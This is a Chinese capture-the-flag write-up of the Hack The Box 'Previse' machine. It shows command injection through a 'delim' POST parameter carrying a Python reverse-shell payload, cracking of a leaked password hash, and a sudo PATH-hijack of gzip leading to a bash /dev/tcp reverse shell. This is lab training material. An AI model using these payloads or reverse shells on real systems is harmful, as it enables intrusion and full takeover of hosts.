# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开启端口
```
root💀kali)-[~/htb/Previse]
└─# nmap -p- 10.10.11.104 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 01:02 EST
Nmap scan report for 10.10.11.104
Host is up (0.52s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 105.58 seconds

```

查看端口开启信息
```

┌──(root💀kali)-[~/htb/Previse]
└─# nmap -sV -T4 -A -O -p 22,80 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 01:04 EST
Nmap scan report for 10.10.11.104
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   493.05 ms 10.10.16.1
2   493.17 ms 10.10.11.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.62 seconds

```

## web
80端口打开是一个登陆页面,不知道用户名和密码

目录爆破没有发现，用burpsuite截断页面枚举各个参数，发现居然可以无登录访问各个页面

在index.php页面返回了几个php页面信息

```
accounts.php
files.php
status.php
file_logs.php
```

每个页面都暴露出了一些有趣的信息

accounts.php显示用户名是```admin```
```
       <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>
        <p>Usernames and passwords must be between 5 and 32 characters!</p>
```



files.php页面显示了有一个```siteBackup.zip```备份文件的信息，还有一个新用户名：```newguy```

```
<table class="uk-table uk-table-hover uk-table-divider">
            <thead>
            <tr>
                <th class="uk-table-shrink">#</th>
                <th class="uk-table-expand">Name</th>
                <th>Size</th>
                <th>User</th>
                <th>Date</th>
                <th>Delete</th>
            </tr>
            </thead>
            <tbody>
                <tr>
                    <td>1</td>
                    <td><a href='download.php?file=32'><button class="uk-button uk-button-text">siteBackup.zip</button></a></td>
                    <td>9948</td>
                    <td>newguy</td>
                    <td>2021-06-12 11:14:34</td>
                    <td><form action="files.php" method="post">
                        <button class="uk-button uk-button-danger uk-button-small" type="button" uk-toggle="target: #offcanvas-flip1">Delete</button>
                        <div id="offcanvas-flip1" uk-offcanvas="flip: true; overlay: true">
                            <div class="uk-offcanvas-bar">
                                <button class="uk-offcanvas-close" type="button" uk-close></button>
                                <h3>Delete File</h3>
                                <p>Are you sure you want to delete this file?</p>
                                <button class="uk-button uk-button-danger uk-button-small" type="submit" name="del" value="32">Delete</button>
                            </div>
                        </div>
                    </form></td>
                </tr></tbody>

```

status.php显示跑了mysql服务，再次确认```admin```账号
```
<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Status</h2>
        <div class="uk-container" uk-grid>
            <div><p>Check website status:</p></div>
        </div>
        <div class="uk-container">
            <p class='uk-text-success'>MySQL server is online and connected!</p><p>There is <b>1</b> registered admin</p><p>There is <b>1</b> uploaded file</p>        </div>
    </div>
</section>
```

file_logs.php显示一个用户操作日志的东西
```
       <h2 class="uk-heading-divider">Request Log Data</h2>
        <p>We take security very seriously, and keep logs of file access actions. We can set delimters for your needs!</p>
        <p>Find out which users have been downloading files.</p>
               <form action="logs.php" method="post">
            <div class="uk-margin uk-width-1-4@s">
                <label class="uk-form-label" for="delim-log">File delimeter:</label>
                <select class="uk-select" name="delim" id="delim-log">
                    <option value="comma">comma</option>
                    <option value="space">space</option>
                    <option value="tab">tab</option>
                </select>
            </div>
            <button class="uk-button uk-button-default" type="submit" value="submit">Submit</button>
        </form>
```

我们最感兴趣的是那个备份文件，但是浏览器无法直接下载。
然后发现accounts.php有一个post表单，貌似可以创建用户
```
       <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
```

如果我们可以创建一个用户，登陆到后台，那应该可以下载备份文件
修改burp的http头为

```
POST /accounts.php HTTP/1.1

Host: 10.10.11.104

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 61

Origin: http://10.10.11.104

Connection: close

Cookie: PHPSESSID=gh706jir5vam1308g1ds54rsi7

Upgrade-Insecure-Requests: 1

X-Forwarded-For:1.1.1.1



username=test123&password=123456&confirm=123456&submit=submit
```

创建用户成功
```
<p>Success! User was added!</p>
```

现在用```test123:123456```可以登陆后台下载文件

暴露出一个数据库密码
```
┌──(root💀kali)-[~/htb/Previse/siteBackup]
└─# cat config.php 
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

```

LOG DATA页面导出的日志暴露出一个用户名:```m4lwhere```
```
┌──(root💀kali)-[~/htb/Previse]
└─# cat out.log   
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1641110772,test123,32
```
# foodhold
查看logs.php源代码
```
┌──(root💀kali)-[~/htb/Previse/siteBackup]
└─# cat logs.php 
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>

```

```delim```这个参数貌似被当成了一个系统命令执行了，假如我们可以劫持这个命令，就可以拿到一个foodhold

我们修改delim参数，ping我们的攻击机看是否能接收到icmp包

```
POST /logs.php HTTP/1.1

Host: 10.10.11.104

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 52

Origin: http://10.10.11.104

Connection: close

Referer: http://10.10.11.104/file_logs.php

Cookie: PHPSESSID=gh706jir5vam1308g1ds54rsi7

Upgrade-Insecure-Requests: 1



delim=comma;ping 10.10.16.3
```

收到了icmp包，证明可以劫持命令
```
┌──(root💀kali)-[~]
└─# tcpdump -i tun0                                                                                 1 ⨯
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:01:18.750750 IP 10.10.16.3.58226 > 10.10.11.104.http: Flags [S], seq 1822473997, win 64240, options [mss 1460,sackOK,TS val 1564233421 ecr 0,nop,wscale 7], length 0
04:01:19.009962 IP 10.10.11.104.http > 10.10.16.3.58226: Flags [S.], seq 4230985501, ack 1822473998, win 65160, options [mss 1355,sackOK,TS val 2920975681 ecr 1564233421,nop,wscale 7], length 0
04:01:19.010035 IP 10.10.16.3.58226 > 10.10.11.104.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1564233680 ecr 2920975681], length 0
04:01:19.010276 IP 10.10.16.3.58226 > 10.10.11.104.http: Flags [P.], seq 1:544, ack 1, win 502, options [nop,nop,TS val 1564233680 ecr 2920975681], length 543: HTTP: POST /logs.php HTTP/1.1
04:01:19.566526 IP 10.10.11.104.http > 10.10.16.3.58226: Flags [.], ack 544, win 505, options [nop,nop,TS val 2920976244 ecr 1564233680], length 0
04:01:20.102479 IP 10.10.11.104 > 10.10.16.3: ICMP echo request, id 21779, seq 1, length 64
04:01:20.102498 IP 10.10.16.3 > 10.10.11.104: ICMP echo reply, id 21779, seq 1, length 64
04:01:22.130164 IP 10.10.11.104 > 10.10.16.3: ICMP echo request, id 21779, seq 2, length 64
04:01:22.130222 IP 10.10.16.3 > 10.10.11.104: ICMP echo reply, id 21779, seq 2, length 64
04:01:22.385193 IP 10.10.11.104 > 10.10.16.3: ICMP echo request, id 21779, seq 3, length 64
04:01:22.385232 IP 10.10.16.3 > 10.10.11.104: ICMP echo reply, id 21779, seq 3, length 64
```


使用下面playload
```
delim=space;/usr/bin/python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

拿到foodhold
```
┌──(root💀kali)-[~/htb/Previse]
└─# nc -lnvp 4242  
listening on [any] 4242 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.104] 39702
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# user

```www-data```没有权限查看user.txt，需要提权到```m4lwhere```，用上面数据库的配置登陆到mysql

```
mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | test123  | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2022-01-02 09:16:40 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

```

在account.php里，密码哈希是这样加密的
```
$hash = crypt($password, '$1$🧂llol$');
```


crypt是php里面的内置函数，看说明
```

crypt
(PHP 4, PHP 5, PHP 7, PHP 8)

crypt — 单向字符串散列

说明 ¶
crypt(string $str, string $salt = ?): string
crypt() 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串。

```

第一个参数是明文，第二个是盐值。

把哈希值保留到本地，用john破解
```
┌──(root💀kali)-[~/htb/Previse]
└─# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:04:43 DONE (2022-01-02 04:53) 0.003530g/s 26173p/s 26173c/s 26173C/s ilovecodydean..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


ssh连到```m4lwhere```，拿到user.txt

# root

查看sudo权限
```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$ ls -alh /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh

```

可以执行一个bash脚本

查看脚本内容：
```
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

```

看到在脚本里使用了gzip命令，把日志文件备份到``` /var/backups```目录

提权的思路是，劫持gzip这个命令，改写gzip的内容，提权到root

查看当前用户的环境变量
```
m4lwhere@previse:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

把当前家目录添加到环境变量 $PATH中
```export PATH=/home/m4lwhere:$PATH ```


再次查看$PATH
```
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

已成功添加

创建gzip文件，赋权为可执行
```
m4lwhere@previse:~$ touch gzip
m4lwhere@previse:~$ chmod +x gzip

```


把下面命令写进gzip文件
```
#!/bin/bash
bash -p
```

查看
```
m4lwhere@previse:~$ cat gzip 
#!/bin/bash
bash -p

```

执行sudo命令
```
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
root@previse:~# id
root@previse:~# whoami
root@previse:~# cat /root/root.txt
root@previse:~# pwd

```

看见已经提权到root，但是所有命令都没有回显。不过没关系，我们可以反弹一个shell

使用下面命令：

```bash -i >& /dev/tcp/10.10.16.3/4242 0>&1```

拿到一个新shell
```
┌──(root💀kali)-[~/htb/Previse]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.104] 42990
root@previse:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@previse:~# whoami
whoami
root

```

# 总结
foothold比较困难，如果一直盯着浏览器的回显看，那就可能错失进攻点,需要用burp fuzzing
foothold具体实施和root都是通过命令劫持，比较简单，知道有这个思路就问题不大。
